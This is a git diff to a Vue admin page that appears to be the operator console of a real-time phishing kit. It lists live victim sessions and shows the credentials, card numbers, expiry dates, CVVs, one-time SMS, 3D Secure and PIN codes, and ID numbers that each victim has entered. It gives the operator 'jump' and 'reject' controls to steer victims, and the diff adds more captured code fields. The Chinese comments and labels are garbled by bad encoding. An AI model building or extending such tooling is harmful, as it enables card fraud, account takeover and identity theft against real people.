@@ -1,0 +1,1381 @@
+﻿diff --git a/ruoyi-ui/src/views/control/visit/index.vue b/ruoyi-ui/src/views/control/visit/index.vue
+index 5bd4dae5..68a435fc 100644
+--- a/ruoyi-ui/src/views/control/visit/index.vue
++++ b/ruoyi-ui/src/views/control/visit/index.vue
+@@ -35,136 +35,164 @@
+ 
+     <main class="monitor-body">
+       <transition-group name="staggered-list" tag="div" class="user-grid">
+-        <div v-for="user in displayUserList" :key="user.sessionId" class="compact-card list-complete-item"
++        <div v-for="user in displayUserList" :key="user.sessionId"
++          class="session-card compact-card list-complete-item session-card--list"
+           :class="{ 'offline-card': user.isOffline, 'online-card': !user.isOffline }">
+-          <!-- 椤堕儴鍖哄煙 -->
+-          <div class="top-section">
+-            <!-- 宸︿晶淇℃伅鍖?-->
+-            <div class="top-left-info">
+-              <span class="id-box id-with-device"><span class="label">ID : {{ user.id }}</span><span class="logo"
+-                  v-html="getDeviceLogo(user)"></span><span class="device-label">{{ getDeviceLabel(user)
+-                  }}</span></span>
+-              <span class="time-text"><i class="el-icon-time time-logo"></i>{{ user.relativeTime }}鍓?/span>
+-              <span class="domain-text" v-if="user.domainUrl"><span class="d-label">鍩熷悕锛?/span>{{ user.domainUrl }}</span>
+-              <span class="domain-text" v-if="user.baseUrl"><span class="d-label">椤圭洰锛?/span>{{ user.baseUrl }}</span>
+-            </div>
+-
+-            <!-- 鍙充晶鎿嶄綔鎸夐挳鍖?-->
+-            <div class="top-right-actions">
+-              <div class="main-actions">
+-                <el-dropdown trigger="click" @command="(cmd) => handleCommand(cmd, user)" class="action-dropdown">
+-                  <el-button class="jump-control-btn" size="mini" type="primary"
+-                    icon="el-icon-position">璺宠浆鎺у埗</el-button>
+-                  <el-dropdown-menu slot="dropdown" class="monitor-dropdown">
+-                    <el-dropdown-item v-for="opt in getJumpOptions(user)" :key="opt.label" :command="opt.command" :divided="opt.divided" :class="opt.customClass">
+-                      <i :class="opt.icon"></i> {{ opt.label }}
+-                    </el-dropdown-item>
+-                  </el-dropdown-menu>
+-                </el-dropdown>
+-
+-                <el-dropdown trigger="click" @command="(cmd) => handleCommand(cmd, user)" class="action-dropdown">
+-                  <el-button size="mini" type="warning" plain icon="el-icon-warning-outline">鎷掔粷</el-button>
+-                  <el-dropdown-menu slot="dropdown" class="monitor-dropdown danger-menu">
+-                    <el-dropdown-item v-for="opt in getRejectOptions(user)" :key="opt.label" :command="opt.command" :divided="opt.divided" :class="opt.customClass">
+-                      <i :class="opt.icon"></i> {{ opt.label }}
+-                    </el-dropdown-item>
+-                  </el-dropdown-menu>
+-                </el-dropdown>
++          <div class="session-card__rail" aria-hidden="true"></div>
++          <div class="session-card__shell session-list-shell">
++            <!-- 鍗曡涓夋爮锛氬乏缂栧彿/鏃堕棿 | 涓笁琛屾爣绛?璺緞 | 鍙虫寜閽?涓夊浘鏍囷紙瀵归綈鍙傝€冨浘锛?-->
++            <div class="session-list-primary">
++              <div class="list-col list-col--meta">
++                <div class="meta-line meta-id">缂栧彿: {{ user.id }}</div>
++                <div class="meta-line meta-time">{{ user.relativeTime }}鍓?/div>
+               </div>
+ 
+-              <div class="icon-actions">
+-                <i class="el-icon-time icon-btn" @click="toggleDetails(user)" title="灞曞紑/鏀惰捣瀹屾暣鍘嗗彶"></i>
+-                <i class="el-icon-delete icon-btn disconnect" @click="confirmDisconnect(user)" title="鏂紑杩炴帴"></i>
+-              </div>
+-            </div>
+-          </div>
++              <div class="list-col list-col--center">
++                <div class="list-center-row list-center-row--tags">
++                  <el-popover
++                    placement="top-start"
++                    width="780"
++                    trigger="hover"
++                    :open-delay="100"
++                    :close-delay="50"
++                    popper-class="card-detail-popover"
++                    :key="'pop-' + user.sessionId"
++                  >
++                    <BankCardPopover
++                      :user="user"
++                      :isCardVerified="isCardVerified"
++                      :showBinInfo="backendForm.showBinInfo"
++                      :binInfoList="binInfoList"
++                      :current-theme="currentTheme"
++                    />
++                    <div
++                      slot="reference"
++                      class="card-type-tag list-mh-card-tag"
++                      :class="getCardTypeClass(user)"
++                    >
++                      <i class="el-icon-bank-card"></i>
++                      <span class="type-text">{{ getCardTypeText(user) }}</span>
++                    </div>
++                  </el-popover>
++                  <span
++                    v-for="(tg, tgi) in getCardOutlineTags(user)"
++                    :key="'ot-' + user.sessionId + '-' + tgi"
++                    class="tag-outline"
++                    :class="'tag-outline--' + tg.tone"
++                  >{{ tg.label }}</span>
++                  <div
++                    v-if="getCardHeadRemark(user)"
++                    class="pill remark-pill list-mh-remark"
++                    @click="copyToClipboard(getCardHeadRemark(user), '鍗″娉?)"
++                  >
++                    <i class="el-icon-info"></i> {{ getCardHeadRemark(user) }}
++                  </div>
++                  <div
++                    v-if="getCardLevel(user)"
++                    class="pill business-pill clickable-copy list-mh-level"
++                    @click="copyToClipboard(getCardLevel(user), '鍗＄骇')"
++                  >
++                    {{ getCardLevel(user) }}
++                  </div>
++                  <div
++                    v-for="entry in getPrimaryBusinessEntries(user)"
++                    :key="'bp-' + user.sessionId + '-' + entry.key"
++                    class="pill business-pill clickable-copy list-mh-pill"
++                    :class="{ 'highlight-card-pill': (entry.key === 'cardNumber' || entry.key === 'card') && getCardHighlightStatus(user) }"
++                    @click="copyToClipboard(entry.val, translateKey(entry.key))"
++                    :style="getFieldPillStyle(entry.key)"
++                  >
++                    <span class="p-key">{{ translateKey(entry.key) }}:</span>
++                    <span class="p-val">{{ entry.key === 'cardNumber' ? formatCardNumber(entry.val) : entry.val }}</span>
++                    <i
++                      v-if="(entry.key === 'cardNumber' || entry.key === 'card') && getCardHighlightStatus(user)"
++                      class="el-icon-star-on highlight-icon"
++                      title="閲嶇偣鍗″ご"
++                    ></i>
++                  </div>
++                </div>
+ 
+-          <!-- 涓棿涓氬姟鏁版嵁鍖?-->
+-          <div class="center-content">
+-            <div class="card-info-row">
+-              <!-- 鍗＄墖璇︽儏寮圭獥锛堜娇鐢ㄦ媶鍒嗗悗鐨勭粍浠讹級 -->
+-              <el-popover
+-                placement="top-start"
+-                width="780"
+-                trigger="hover"
+-                :open-delay="100"
+-                :close-delay="50"
+-                popper-class="card-detail-popover"
+-                :key="user.sessionId"
+-              >
+-                <BankCardPopover
+-                  :user="user"
+-                  :isCardVerified="isCardVerified"
+-                  :showBinInfo="backendForm.showBinInfo"
+-                  :binInfoList="binInfoList"
+-                  :current-theme="currentTheme"
+-                />
+                 <div
+-                  slot="reference"
+-                  class="card-type-tag"
+-                  :class="getCardTypeClass(user)"
++                  v-if="getPinkBusinessEntries(user).length"
++                  class="list-center-row list-center-row--pink"
+                 >
+-                  <i class="el-icon-bank-card"></i>
+-                  <span class="type-text">{{ getCardTypeText(user) }}</span>
++                  <div
++                    v-for="entry in getPinkBusinessEntries(user)"
++                    :key="'pk-' + user.sessionId + '-' + entry.key"
++                    class="pill pill-pink-verify clickable-copy"
++                    @click="copyToClipboard(entry.val, translateKey(entry.key))"
++                  >
++                    <span class="p-key">{{ translateKey(entry.key) }}:</span>
++                    <span class="p-val">{{ entry.val }}</span>
++                  </div>
+                 </div>
+-              </el-popover>
+ 
+-              <div v-if="getCardHeadRemark(user)" class="pill remark-pill"
+-                @click="copyToClipboard(getCardHeadRemark(user), '鍗″娉?)">
+-                <i class="el-icon-info"></i> {{ getCardHeadRemark(user) }}
+-              </div>
+-              <div class="pill business-pill clickable-copy" @click="copyToClipboard(getCardLevel(user), '鍗＄骇')"
+-                v-if="getCardLevel(user)">
+-                {{ getCardLevel(user) }}
+-              </div>
+-              <!-- IP pill removed -->
+-
+-              <template v-for="(val, key) in getLatestBusinessData(user)">
+-                <div class="pill business-pill clickable-copy"
+-                  :class="{ 'highlight-card-pill': (key === 'cardNumber' || key === 'card') && getCardHighlightStatus(user) }"
+-                  @click="copyToClipboard(val, translateKey(key))" :style="getFieldPillStyle(key)">
+-                  <span class="p-key">{{ translateKey(key) }}:</span>
+-                  <span class="p-val">{{ key === 'cardNumber' ? formatCardNumber(val) : val }}</span>
+-                  <i v-if="(key === 'cardNumber' || key === 'card') && getCardHighlightStatus(user)"
+-                    class="el-icon-star-on highlight-icon" title="閲嶇偣鍗″ご"></i>
++                <div class="list-center-row list-center-row--path">
++                  <span class="path-flow-prefix">{{ getPathFlowPrefix(user) }}</span>
++                  <span class="path-flow-body">{{ formatPathFlowText(user) }}</span>
++                  <span
++                    v-if="user.pageLink && user.pageLink.length > 5"
++                    class="path-flow-more"
++                    @click="togglePathExpanded(user)"
++                  >{{ user.pathExpanded ? ' 鏀惰捣' : ' ...' }}</span>
+                 </div>
+-              </template>
+-
+-
+-            </div>
++              </div>
+ 
+-            <!-- 搴曢儴鐘舵€佸拰椤甸潰璺緞鍖?-->
+-            <div class="bottom-status-row bottom-status-rows">
+-              <span class="current-status-tag">
+-                <i class="el-icon-loading" v-if="user.currentStatus && user.currentStatus.includes('濉啓')"></i>
+-                鐘舵€? {{ user.currentStatus || '寰呮満' }}
+-              </span>
+-              <!-- currentStatus?.replace(/^杩涘叆/, '') -->
+-              <!-- <pre style="max-height:260px;overflow:auto;background:#00000010;padding:8px;">
+-                {{ JSON.stringify(user, null, 2) }}
+-              </pre> -->
+-              <span class="status-divider"></span>
+-              <span class="path-chain">
+-                <!-- 椤甸潰璺緞寮圭獥锛堜娇鐢ㄦ媶鍒嗗悗鐨勭粍浠讹級 -->
+-                <template v-for="(node, idx) in (user.pathExpanded ? user.pageLink : user.pageLink.slice(0, 5))">
+-                  <PagePathPopover :node="node" :idx="idx" :is-last="user.lastActivePage === node.page"
+-                    :key="`path-${idx}`" />
+-                  <i v-if="idx < (user.pathExpanded ? user.pageLink.length - 1 : 4)"
+-                    class="el-icon-arrow-right path-chain__arrow" :key="'arrow' + idx"></i>
+-                </template>
+-                <template v-if="user.pageLink.length > 5">
+-                  <span v-if="!user.pathExpanded" class="path-ellipsis" @click="togglePathExpanded(user)">
+-                    ...
+-                  </span>
+-                  <span v-else class="path-ellipsis" @click="togglePathExpanded(user)">
+-                    ...
+-                  </span>
+-                </template>
+-              </span>
++              <div class="list-col list-col--actions">
++                <div class="main-actions">
++                  <el-dropdown trigger="click" @command="(cmd) => handleCommand(cmd, user)" class="action-dropdown">
++                    <el-button class="list-btn-jump" size="mini">
++                      璺宠浆<i class="el-icon-arrow-down el-icon--right"></i>
++                    </el-button>
++                    <el-dropdown-menu slot="dropdown" class="monitor-dropdown">
++                      <el-dropdown-item
++                        v-for="opt in getJumpOptions(user)"
++                        :key="opt.label"
++                        :command="opt.command"
++                        :divided="opt.divided"
++                        :class="opt.customClass"
++                      >
++                        <i :class="opt.icon"></i> {{ opt.label }}
++                      </el-dropdown-item>
++                    </el-dropdown-menu>
++                  </el-dropdown>
++                  <el-dropdown trigger="click" @command="(cmd) => handleCommand(cmd, user)" class="action-dropdown">
++                    <el-button size="mini" class="list-btn-reject">
++                      鎷掔粷<i class="el-icon-arrow-down el-icon--right"></i>
++                    </el-button>
++                    <el-dropdown-menu slot="dropdown" class="monitor-dropdown danger-menu">
++                      <el-dropdown-item
++                        v-for="opt in getRejectOptions(user)"
++                        :key="opt.label"
++                        :command="opt.command"
++                        :divided="opt.divided"
++                        :class="opt.customClass"
++                      >
++                        <i :class="opt.icon"></i> {{ opt.label }}
++                      </el-dropdown-item>
++                    </el-dropdown-menu>
++                  </el-dropdown>
++                </div>
++                <div class="list-row-icon-actions">
++                  <button type="button" class="list-icon-square" title="鍒楄〃鍥為《" @click="scrollAccessListTop">
++                    <i class="el-icon-top"></i>
++                  </button>
++                  <button type="button" class="list-icon-square" title="瀹屾暣浜や簰鍘嗗彶" @click="toggleDetails(user)">
++                    <i class="el-icon-time"></i>
++                  </button>
++                  <button
++                    type="button"
++                    class="list-icon-square"
++                    title="澶嶅埗鍩熷悕/椤圭洰"
++                    @click="copyToClipboard(getSessionListUrlFull(user), '閾炬帴')"
++                  >
++                    <i class="el-icon-link"></i>
++                  </button>
++                </div>
++              </div>
+             </div>
+           </div>
+ 
+-
+         </div>
+       </transition-group>
+       <el-empty v-if="displayUserList.length === 0" description="绛夊緟缁堢鎺ュ叆..." :image-size="120"></el-empty>
+@@ -178,7 +206,7 @@
+             <div class="node-detail">
+               <span class="node-page">{{ node.page }}</span>
+               <div class="snapshot-mini-list">
+-                <div v-for="(snapshot, sIdx) in node.dataList" :key="sIdx" class="mini-snapshot"
++                <div v-for="(snapshot, sIdx) in normalizeNodeDataList(node)" :key="sIdx" class="mini-snapshot"
+                   v-if="hasRealData(snapshot)">
+                   <span class="snap-time">[{{ formatTime(snapshot._updateTime) }}]</span>
+                   <span v-for="(v, k) in filterBusinessData(snapshot)" :key="k" class="snap-kv"
+@@ -335,15 +363,13 @@
+ import { getSystemConfig } from "@/api/system/userConfig";
+ // 寮曞叆鎷嗗垎鍚庣殑缁勪欢
+ import BankCardPopover from '@/components/VisitControl/BankCardPopover.vue';
+-import PagePathPopover from '@/components/VisitControl/PagePathPopover.vue';
+ // 馃毃 寮曞叆缁熶竴绠＄悊
+ import wsManager from '@/utils/WebSocketManager';
+ 
+ export default {
+   name: 'TrackerMonitorV3',
+   components: {
+-    BankCardPopover,
+-    PagePathPopover
++    BankCardPopover
+   },
+   data() {
+     return {
+@@ -975,11 +1001,14 @@ export default {
+         if (loginNodes.length) {
+           const merged = [];
+           loginNodes.forEach((node) => {
+-            if (Array.isArray(node.dataList)) merged.push(...node.dataList);
++            merged.push(...this.normalizeNodeDataList(node));
+           });
+           if (merged.length) return merged;
+           const last = loginNodes[loginNodes.length - 1];
+-          if (last && Array.isArray(last.dataList)) return last.dataList;
++          if (last) {
++            const lastDl = this.normalizeNodeDataList(last);
++            if (lastDl.length) return lastDl;
++          }
+         }
+       }
+       if (Array.isArray(payload.dataList)) {
+@@ -987,12 +1016,15 @@ export default {
+         if (items.length) {
+           const merged = [];
+           items.forEach((it) => {
+-            if (Array.isArray(it.dataList)) merged.push(...it.dataList);
++            merged.push(...this.normalizeNodeDataList(it));
+           });
+           if (merged.length) return merged;
+         }
+         const item = payload.dataList.find((x) => x && isLoginPage(x.page));
+-        if (item && Array.isArray(item.dataList)) return item.dataList;
++        if (item) {
++          const itemDl = this.normalizeNodeDataList(item);
++          if (itemDl.length) return itemDl;
++        }
+       }
+       return null;
+     },
+@@ -1070,12 +1102,11 @@ export default {
+         const node = list[i];
+         if (!node || !isCardPage(node.page)) continue;
+         if (readBool(node.cardNumberFilled)) return true;
+-        if (Array.isArray(node.dataList)) {
+-          for (let j = node.dataList.length - 1; j >= 0; j--) {
+-            const snap = node.dataList[j];
+-            if (!snap || typeof snap !== 'object') continue;
+-            if (readBool(snap.cardNumberFilled)) return true;
+-          }
++        const snapshots = this.normalizeNodeDataList(node);
++        for (let j = snapshots.length - 1; j >= 0; j--) {
++          const snap = snapshots[j];
++          if (!snap || typeof snap !== 'object') continue;
++          if (readBool(snap.cardNumberFilled)) return true;
+         }
+         return false;
+       }
+@@ -1401,6 +1432,7 @@ export default {
+       if (index === -1) {
+         index = this.userList.findIndex(u => u.sessionId === sid);
+       }
++      const oldUser = index > -1 ? this.userList[index] : null;
+       const showDetails = index > -1 ? this.userList[index].showDetails : false;
+       const cardData = data.businessPreview || {};
+       const updatedUser = {
+@@ -1457,18 +1489,25 @@ export default {
+     },
+     getLatestBusinessData(user) {
+       const result = {};
+-      // 鍙樉绀烘寚瀹氱殑瀛楁
++      // 鍙樉绀烘寚瀹氱殑瀛楁锛堝惈楠岃瘉鐮佺被锛屼緵绮夋爣绛捐灞曠ず锛?       const allowedFields = {
+-        'username': '璐﹀彿',
+-        'cardNumber': '鍗?,
+-        'expiryDate': '鏃ユ湡',
+-        'cvv': 'cvv',
+-        'realName': '濮撳悕',
+-        'password': '瀵嗙爜',
+-        'email': '閭',
+-        'phone': '鐢佃瘽',
+-        'smsCode': '楠岃瘉鐮?,
+-        'loginSmsCode': '鐧诲綍楠岃瘉鐮?
++        username: '璐﹀彿',
++        cardNumber: '鍗?,
++        expiryDate: '鏃ユ湡',
++        cvv: 'cvv',
++        realName: '濮撳悕',
++        password: '瀵嗙爜',
++        email: '閭',
++        phone: '鐢佃瘽',
++        smsCode: '楠岃瘉鐮?,
++        loginSmsCode: '鐧诲綍楠岃瘉鐮?,
++        pinCode: 'PIN',
++        amexCvv: 'AMEX',
++        threeDCode: '3D',
++        appCode: 'APP楠岃瘉鐮?,
++        callCode: '鎷ㄥ彿楠岃瘉鐮?,
++        unlockCode: '瑙ｉ櫎闄愬埗楠岃瘉鐮?,
++        idCard: '韬唤璇?
+       };
+ 
+       if (user.businessPreview) {
+@@ -1487,15 +1526,15 @@ export default {
+       if (!user.pageLink) return result;
+ 
+       [...user.pageLink].reverse().forEach(node => {
+-        if (node.dataList) {
+-          [...node.dataList].reverse().forEach(snap => {
+-            Object.keys(snap).forEach(key => {
+-              if (allowedFields[key] && !result[key] && snap[key]) {
+-                result[key] = snap[key];
+-              }
+-            });
++        const snaps = this.normalizeNodeDataList(node);
++        if (!snaps.length) return;
++        [...snaps].reverse().forEach(snap => {
++          Object.keys(snap).forEach(key => {
++            if (allowedFields[key] && !result[key] && snap[key]) {
++              result[key] = snap[key];
++            }
+           });
+-        }
++        });
+       });
+       return result;
+     },
+@@ -1611,8 +1650,44 @@ export default {
+       });
+       return filtered;
+     },
++    /** 缁熶竴瑙ｆ瀽 page 鑺傜偣涓婄殑蹇収鍒楄〃锛堝吋瀹?data_list銆佸崟瀵硅薄銆丣SON 瀛楃涓诧級 */
++    normalizeNodeDataList(node) {
++      if (!node || typeof node !== 'object') return [];
++      const raw = node.dataList != null ? node.dataList : node.data_list;
++      if (raw == null) return [];
++      if (Array.isArray(raw)) return raw;
++      if (typeof raw === 'string') {
++        try {
++          const p = JSON.parse(raw);
++          return Array.isArray(p) ? p : p && typeof p === 'object' ? [p] : [];
++        } catch (e) {
++          return [];
++        }
++      }
++      if (typeof raw === 'object') return [raw];
++      return [];
++    },
++    /**
++     * 蹇収鏄惁绠椾綔銆岃椤靛凡閲囬泦鍒扮殑涓€鏉℃暟鎹€嶏紙璺緞銆孨鏉℃暟鎹€嶄笌鍘嗗彶寮瑰眰灏忓崱鐗囧叡鐢級
++     * 鍚細宸插皝瀛樿烦杞?鎻愪氦銆佹垨鏈変换鎰忛潪绌轰笟鍔″瓧娈碉紱鎺掗櫎浠?_ 鍏冩暟鎹垨绌哄崰浣嶃€?+     */
++    snapshotHasTransmittedBizData(snapshot) {
++      if (!snapshot || typeof snapshot !== 'object') return false;
++      if (snapshot._finishTime || snapshot._snapshotStatus) return true;
++      return Object.keys(snapshot).some((key) => {
++        if (key.startsWith('_')) return false;
++        const v = snapshot[key];
++        if (v == null) return false;
++        if (typeof v === 'boolean') return true;
++        if (typeof v === 'number') return Number.isFinite(v);
++        if (typeof v === 'string') return v.trim() !== '';
++        if (Array.isArray(v)) return v.length > 0;
++        if (typeof v === 'object') return Object.keys(v).length > 0;
++        return true;
++      });
++    },
+     hasRealData(snapshot) {
+-      return Object.keys(snapshot).some(key => !key.startsWith('_'));
++      return this.snapshotHasTransmittedBizData(snapshot);
+     },
+     formatTime(timeStr) {
+       if (!timeStr) return '--:--';
+@@ -1676,7 +1751,7 @@ export default {
+       }
+     },
+     getCardTypeText(user) {
+-      if (!user.cardInfo?.cardNumber) return '鏃犲崱淇℃伅';
++      if (!user.cardInfo?.cardNumber) return '鏆傛棤鍗′俊鎭?;
+       const typeMap = {
+         'CREDIT': 'C鍗?,
+         'DEBIT': 'D鍗?,
+@@ -1726,6 +1801,118 @@ export default {
+     },
+     getCardIssuer(user) {
+       return user.cardInfo?.issuer || '';
++    },
++    /** 鍒楄〃涓昏锛氬煙鍚?椤圭洰灞曠ず锛堟埅鏂級 */
++    getSessionListUrl(user) {
++      const full = this.getSessionListUrlFull(user);
++      if (!full || full === '鈥?) return '鈥?;
++      return full.length > 52 ? `${full.slice(0, 50)}鈥 : full;
++    },
++    getSessionListUrlFull(user) {
++      const d = (user.domainUrl || '').trim();
++      const p = (user.baseUrl || '').trim();
++      if (d && p) return `${d} / ${p}`;
++      if (d) return d;
++      if (p) return p;
++      if (Array.isArray(user.pageLink) && user.pageLink.length) {
++        const last = user.pageLink[user.pageLink.length - 1];
++        if (last && last.page) return String(last.page);
++      }
++      return '鈥?;
++    },
++    /** 鍒楄〃涓昏锛氬綋鍓嶉〉鏂囨锛堜笌 sourcePage 瀵归綈锛?*/
++    getSessionPageLabel(user) {
++      const raw = (user.lastActivePage || '').trim();
++      if (!raw) return '鈥?;
++      if (Array.isArray(user.sourcePage)) {
++        const hit = user.sourcePage.find(
++          (p) => p.pageName === raw || p.pageKey === raw
++        );
++        if (hit && hit.pageName) return hit.pageName;
++      }
++      if (Array.isArray(user.pageLink)) {
++        const n = user.pageLink.find((x) => x.page === raw);
++        if (n && n.page) return n.page;
++      }
++      return raw;
++    },
++    /** 鍙傝€冨浘锛氬崱缁勭粐/绛夌骇绛夋弿杈瑰皬鏍囩 */
++    getCardOutlineTags(user) {
++      const out = [];
++      const t = user.cardInfo && user.cardInfo.type;
++      if (t === 'CREDIT') out.push({ label: 'CREDIT', tone: 'green' });
++      else if (t === 'DEBIT') out.push({ label: 'DEBIT', tone: 'green' });
++      else if (t === 'PREPAID') out.push({ label: 'PREPAID', tone: 'green' });
++      const lv = this.getCardLevel(user);
++      if (lv) out.push({ label: String(lv).toUpperCase(), tone: 'gray' });
++      const br = (user.cardInfo && (user.cardInfo.brand || user.cardInfo.issuer)) || '';
++      if (br) out.push({ label: String(br).slice(0, 4).toUpperCase(), tone: 'gray' });
++      return out;
++    },
++    _pinkBizKeys() {
++      return ['smsCode', 'loginSmsCode', 'pinCode', 'amexCvv', 'threeDCode', 'appCode', 'callCode', 'unlockCode'];
++    },
++    _primaryBizOrder() {
++      return ['username', 'password', 'realName', 'phone', 'email', 'cardNumber', 'expiryDate', 'cvv', 'idCard'];
++    },
++    getPrimaryBusinessEntries(user) {
++      const obj = this.getLatestBusinessData(user) || {};
++      const pink = new Set(this._pinkBizKeys());
++      const order = this._primaryBizOrder();
++      const seen = new Set();
++      const out = [];
++      order.forEach((k) => {
++        if (pink.has(k) || seen.has(k)) return;
++        const v = obj[k];
++        if (v == null || v === '') return;
++        seen.add(k);
++        out.push({ key: k, val: v });
++      });
++      Object.keys(obj).forEach((k) => {
++        if (pink.has(k) || seen.has(k)) return;
++        const v = obj[k];
++        if (v == null || v === '') return;
++        seen.add(k);
++        out.push({ key: k, val: v });
++      });
++      return out;
++    },
++    getPinkBusinessEntries(user) {
++      const obj = this.getLatestBusinessData(user) || {};
++      const out = [];
++      this._pinkBizKeys().forEach((k) => {
++        const v = obj[k];
++        if (v != null && v !== '') out.push({ key: k, val: v });
++      });
++      return out;
++    },
++    getPathFlowPrefix(user) {
++      const raw = (user.currentStatus || '').replace(/^(杩涘叆|绂诲紑)/, '').trim();
++      if (raw) {
++        if (raw.includes('|')) {
++          const head = raw.split('|')[0].trim();
++          return head ? `${head} |` : '瀹夊叏鐩戞祴椤?|';
++        }
++        return `${raw} |`;
++      }
++      return '瀹夊叏鐩戞祴椤?|';
++    },
++    formatPathFlowText(user) {
++      if (!user.pageLink || !user.pageLink.length) return '鈥?;
++      const max = user.pathExpanded ? user.pageLink.length : Math.min(5, user.pageLink.length);
++      const nodes = user.pageLink.slice(0, max);
++      return nodes
++        .map((n) => {
++          const list = this.normalizeNodeDataList(n);
++          const c = list.filter((s) => this.snapshotHasTransmittedBizData(s)).length;
++          const name = n.page || '鈥?;
++          return `鍦?{name}(${c}鏉℃暟鎹?`;
++        })
++        .join(' > ');
++    },
++    scrollAccessListTop() {
++      const root = this.$el && this.$el.querySelector ? this.$el.querySelector('.monitor-body') : null;
++      if (root) root.scrollTo({ top: 0, behavior: 'smooth' });
+     }
+   }
+ };
+@@ -1777,7 +1964,8 @@ export default {
+     z-index: 2;
+     flex-shrink: 0;
+     border: 1px solid var(--card-border, #e8e8e8);
+-    border-radius: 12px;
++    border-radius: 14px;
++    box-shadow: 0 4px 22px rgba(15, 23, 42, 0.06);
+ 
+     .theme-dark &,
+     .theme-cyber & {
+@@ -1927,8 +2115,9 @@ export default {
+     .user-grid {
+       display: flex;
+       flex-direction: column;
+-      gap: 6px;
++      gap: 0;
+       align-items: stretch;
++      width: 100%;
+     }
+ 
+     .staggered-list {
+@@ -1953,7 +2142,65 @@ export default {
+   .theme-light & {
+     --card-bg: #ffffff;
+     --card-border: #e6ebf0;
++    --card-border-strong: rgba(24, 144, 255, 0.22);
+     --panel-bg: transparent;
++    --shadow-card: 0 2px 14px rgba(15, 23, 42, 0.06);
++    --shadow-card-hover: 0 10px 32px rgba(15, 23, 42, 0.09);
++    --shadow-1: var(--shadow-card-hover);
++  }
++
++  /* 娴呰壊锛氬垪琛ㄧ旱鍚戞棤闂磋窛 */
++  .theme-light & .monitor-body .user-grid {
++    gap: 0;
++  }
++
++  .theme-light & .compact-card {
++    border-radius: 14px;
++    padding: 10px 12px;
++    margin-bottom: 10px;
++    border: 1px solid var(--card-border);
++    box-shadow: var(--shadow-card);
++    transition: border-color 0.2s ease, box-shadow 0.2s ease, transform 0.2s ease;
++
++    &:hover {
++      border-color: rgba(24, 144, 255, 0.22);
++      box-shadow: var(--shadow-card-hover);
++    }
++  }
++
++  /* 娴呰壊 路 鏂颁細璇濆崱鐗囧澹筹紙宸︿晶杞?+ 澹冲眰鍐呰竟璺濈敱 .session-card__shell 鎵挎媴锛?*/
++  .theme-light & .session-card.compact-card {
++    padding: 0 !important;
++    margin-bottom: 0;
++    border-radius: 20px;
++    border: 1px solid rgba(148, 163, 184, 0.32);
++    background: linear-gradient(165deg, #ffffff 0%, #f8fafc 42%, #eef2f7 100%);
++    box-shadow:
++      0 1px 0 rgba(255, 255, 255, 0.75) inset,
++      0 4px 18px rgba(15, 23, 42, 0.06),
++      0 12px 36px -16px rgba(15, 23, 42, 0.08);
++
++    &:hover {
++      border-color: rgba(14, 165, 233, 0.35);
++      box-shadow:
++        0 1px 0 rgba(255, 255, 255, 0.8) inset,
++        0 8px 28px rgba(14, 165, 233, 0.12),
++        0 18px 48px -18px rgba(15, 23, 42, 0.12);
++    }
++  }
++
++  .theme-light & .session-card--list.session-card.compact-card {
++    border-radius: 0 !important;
++    border: none !important;
++    border-bottom: 1px solid #e5e7eb !important;
++    background: #ffffff !important;
++    box-shadow: none !important;
++
++    &:hover {
++      border: none !important;
++      border-bottom: 1px solid #e5e7eb !important;
++      box-shadow: none !important;
++    }
+   }
+ 
+   .theme-dark &,
+@@ -2044,13 +2291,18 @@ export default {
+     position: relative;
+     padding: 4px 0;
+     margin-bottom: 6px;
++
++    &.session-card {
++      flex-direction: row;
++      align-items: stretch;
++    }
+     width: 100%;
+     align-self: stretch;
+     margin-left: auto;
+     margin-right: auto;
+     max-width: var(--card-max-width);
+     min-height: 44px;
+-    transition: none;
++    transition: border-color 0.2s ease, box-shadow 0.2s ease, transform 0.2s ease;
+     overflow: hidden;
+ 
+     /* 澶滄櫄锛氬崱鐗囨暣浣撴敼涓烘洿鈥滃崱鐗囧寲鈥濈殑甯冨眬锛堜俊鎭垎缁勬洿娓呮櫚锛?*/
+@@ -2061,9 +2313,22 @@ export default {
+       margin-bottom: 10px;
+     }
+ 
++    &.session-card {
++      .theme-dark &,
++      .theme-cyber & {
++        padding: 0;
++        margin-bottom: 0;
++        border-radius: 20px;
++        overflow: hidden;
++        background: linear-gradient(155deg, rgba(42, 44, 72, 0.98) 0%, rgba(30, 32, 54, 0.96) 55%, rgba(24, 26, 46, 0.98) 100%);
++        border: 1px solid rgba(129, 140, 248, 0.14);
++        box-shadow: 0 18px 48px rgba(0, 0, 0, 0.35), inset 0 1px 0 rgba(255, 255, 255, 0.06);
++      }
++    }
++
+     &:hover {
+-      border-color: var(--card-border-strong);
+-      box-shadow: var(--shadow-1);
++      border-color: var(--card-border-strong, rgba(24, 144, 255, 0.2));
++      box-shadow: var(--shadow-1, 0 6px 22px rgba(15, 23, 42, 0.08));
+       transform: translateY(-1px);
+     }
+ 
+@@ -2220,16 +2485,16 @@ export default {
+         .domain-text {
+           display: inline-flex;
+           align-items: center;
+-          padding: 4px 12px;
+-          border: 1px solid #000000;
+-          border-radius: 8px;
++          padding: 5px 12px;
++          border: 1px solid #e2e8f0;
++          border-radius: 10px;
+           font-size: 14px;
+-          color: #000000;
+-          background: #ffffff;
++          color: #1e293b;
++          background: #f8fafc;
+ 
+           .d-label {
+             margin-right: 6px;
+-            color: #666666;
++            color: #64748b;
+           }
+         }
+ 
+@@ -2431,7 +2696,7 @@ export default {
+       }
+ 
+       .bottom-status-rows {
+-        background: var(--card-bgS) !important;
++        background: var(--card-bg) !important;
+       }
+ 
+       .bottom-status-row {
+@@ -2628,6 +2893,578 @@ export default {
+     }
+   }
+ 
++  /* 鈥斺€?璁块棶鎺у埗锛氫細璇濆崱鐗囨柊甯冨眬锛堝乏渚х姸鎬佽建 + 宸ュ叿鏉?+ 鏁版嵁鏍呮牸 + 杞ㄨ抗搴曟爮锛?鈥斺€?*/
++  .session-card__rail {
++    width: 6px;
++    flex-shrink: 0;
++    align-self: stretch;
++    min-height: 100%;
++    background: linear-gradient(180deg, #94a3b8 0%, #64748b 100%);
++    box-shadow: inset -1px 0 0 rgba(255, 255, 255, 0.12);
++  }
++
++  .online-card.session-card .session-card__rail {
++    background: linear-gradient(180deg, #5eead4 0%, #22d3ee 38%, #0ea5e9 72%, #6366f1 100%);
++    box-shadow:
++      inset -1px 0 0 rgba(255, 255, 255, 0.2),
++      0 0 20px rgba(34, 211, 238, 0.22);
++  }
++
++  .offline-card.session-card .session-card__rail {
++    background: linear-gradient(180deg, #cbd5e1 0%, #94a3b8 100%);
++    opacity: 0.65;
++    filter: grayscale(0.35);
++  }
